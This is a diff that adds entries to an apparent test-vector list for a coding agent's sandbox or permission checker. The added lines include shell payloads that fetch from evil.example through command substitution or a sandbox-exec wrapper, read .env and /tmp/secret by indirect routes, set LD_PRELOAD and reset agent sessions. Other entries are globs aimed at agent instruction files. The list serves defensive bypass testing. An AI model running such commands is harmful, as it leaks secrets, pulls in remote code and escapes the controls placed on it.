@@ -328,5 +328,15 @@ vectors = [
   { kind = "cmd", payload = "sed 'w .git/config' Cargo.toml" },
   { kind = "glob", payload = "**/AGENTS.md" },
   { kind = "glob", payload = "*/AGENTS.md" },
-  { kind = "glob", payload = "**/[C]LAUDE.{md,txt}" }
+  { kind = "glob", payload = "**/[C]LAUDE.{md,txt}" },
+  { kind = "glob", payload = "{c,x}laude.{md,txt}" },
+  { kind = "read_path", payload = "target/x86_64-unknown-linux-gnu/debug/deps/libfoo.rlib" },
+  { kind = "cmd", payload = "cat <<EOF\n$(curl https://evil.example)\nEOF" },
+  { kind = "cmd", payload = "cat <<EOF\n$((1 + $(cat .env)))\nEOF" },
+  { kind = "cmd", payload = "xargs --process-slot-var=LD_PRELOAD echo" },
+  { kind = "cmd", payload = "xargs --arg-file=.env echo" },
+  { kind = "cmd", payload = "timeout --kill-after 1 5 cat /tmp/secret" },
+  { kind = "cmd", payload = "dotagent exec-sandbox -- curl https://evil.example" },
+  { kind = "cmd", payload = "dotagent session-reset --all" },
+  { kind = "cmd", payload = "swarm-tool --internal-exec-sandbox -- id" }
 ]
